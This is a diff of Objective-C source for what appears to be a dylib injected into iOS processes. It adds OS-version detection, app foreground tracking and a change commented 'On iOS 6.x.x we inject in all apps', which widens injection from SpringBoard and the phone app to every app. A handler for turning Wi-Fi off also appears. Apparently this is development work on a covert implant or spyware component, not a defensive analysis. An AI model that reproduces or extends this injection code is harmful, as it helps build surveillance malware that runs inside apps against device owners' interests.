@@ -46,8 +46,16 @@
 #define DYLIB_MODULE_RUNNING 1
 #define DYLIB_MODULE_STOPPED 0
 
-static BOOL gInitAlreadyRunned  = FALSE;
+static BOOL gInitAlreadyRunned = FALSE;
 static char gDylibPath[256];
+
+BOOL gIsAppInForeground = TRUE;
+
+// OS version
+u_int gOSMajor  = 0;
+u_int gOSMinor  = 0;
+u_int gOSBugFix = 0;
+
 NSString *gBundleIdentifier = nil;
 
 #ifdef __DEBUG_IOS_DYLIB
@@ -89,6 +97,32 @@ static void TurnWifiOff(CFNotificationCenterRef center,
   //[antani setWiFiEnabled: NO];
 }
 
+void getSystemVersion(u_int *major,
+                      u_int *minor,
+                      u_int *bugFix)
+{
+  NSString *currSysVer = [[UIDevice currentDevice] systemVersion];
+  
+  if ([currSysVer rangeOfString: @"."].location != NSNotFound)
+  {
+    NSArray *versions = [currSysVer componentsSeparatedByString: @"."];
+    
+    if ([versions count] > 2)
+    {
+      *bugFix = (u_int)[[versions objectAtIndex: 2] intValue];
+    }
+    
+    *major  = (u_int)[[versions objectAtIndex: 0] intValue];
+    *minor  = (u_int)[[versions objectAtIndex: 1] intValue];
+  }
+  else
+  {
+#ifdef DEBUG
+    NSLog(@"Error on sys ver (dot not found in string: %@)", currSysVer);
+#endif
+  }
+}
+
 #pragma mark -
 #pragma mark - entry point
 #pragma mark -
@@ -96,6 +130,12 @@ static void TurnWifiOff(CFNotificationCenterRef center,
 BOOL threadIt(void)
 {
   gBundleIdentifier  = [[[NSBundle mainBundle] bundleIdentifier] retain];
+  
+  /*
+   * On iOS 6.x.x we inject in all apps
+   */
+  if (gOSMajor >= 6)
+    return TRUE;
   
   if ([gBundleIdentifier compare: SPRINGBOARD] == NSOrderedSame ||
       [gBundleIdentifier compare: MOBILEPHONE] == NSOrderedSame)
@@ -113,13 +153,14 @@ void init(void)
   
   gInitAlreadyRunned = TRUE;
   
+  getSystemVersion(&gOSMajor, &gOSMinor, &gOSBugFix);
+  
   dylibModule *dyilbMod = [[dylibModule alloc] init];
 
 #ifdef __DEBUG_IOS_DYLIB
   /*
    * -- only for debugging purpose
    */
-  
     catch_me();
     [NSThread detachNewThreadSelector: @selector(dylibMainRunLoop)
                              toTarget: dyilbMod
@@ -284,12 +325,16 @@ void catch_me()
 
 - (void)dylibApplicationWillEnterForeground
 {
+  gIsAppInForeground = TRUE;
+  
   [self sendAsyncFgNotification];
   [self sendNeedConfigRefresh];
 }
 
 - (void)dylibApplicationWillEnterBackground
 {
+  gIsAppInForeground = FALSE;
+  
   [self sendAsyncBgNotification];
 }
 
